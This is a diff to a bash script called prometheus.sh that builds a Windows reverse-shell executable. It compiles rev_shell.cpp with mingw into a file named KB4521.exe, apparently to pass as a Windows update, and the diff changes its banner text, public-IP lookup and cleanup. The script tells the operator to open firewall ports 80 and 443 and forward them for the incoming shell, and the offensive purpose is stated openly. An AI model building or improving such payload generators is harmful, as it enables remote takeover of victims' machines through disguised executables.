@@ -1,4 +1,4 @@
- #!/bin/bash
+#!/bin/bash
 
 RED='\033[1;31m'
 BLUE='\033[1;34m'
@@ -14,11 +14,11 @@ echo -e "|        [Usage]: ./prometheus.sh <IP> <PORT>      |"
 echo -e "+--------------------------------------------------+"
 echo -e "${NC}"
 if [ $# == 0 ] ; then
-    echo "[*] Prometheus will generate a brand new PE with a hardcoded socket address."
-    echo "[!] Don't forget to punch a hole in your FW (80,443) and PRTFWD to the local machine."
+    echo "[*] Prometheus will generate a brand new high-entropy PE with a hardcoded socket address."
     echo -e "${GREEN}"
-    echo -e "Public IP:"
-curl ifconfig.me
+    echo -e "Public IP: $(curl -s ifconfig.io)"
+    echo -e "Public IPv4: $(curl -s ifconfig.me)\x0a"
+    echo "[!] Don't forget to punch a hole in your FW (80,443) and PRTFWD to the local machine."
     echo -e ""
     echo -e "[Usage]: ./prometheus.sh <IP> <PORT>"
     echo -e "${NC}"
@@ -72,11 +72,7 @@ i686-w64-mingw32-g++ rev_shell.cpp -o KB4521.exe -lws2_32 -s -ffunction-sections
 
 echo -e "${GREEN}"
 echo -e "Cleaning up..."
-echo -e "${NC}"
-
-echo -e "${GREEN}"
-echo -e "Done. "
-echo -e "Support The Free Information Movement"
+echo -e "Done. Support The Free Information Movement"
 echo -e "${NC}"
 
 rm rev_shell.cpp
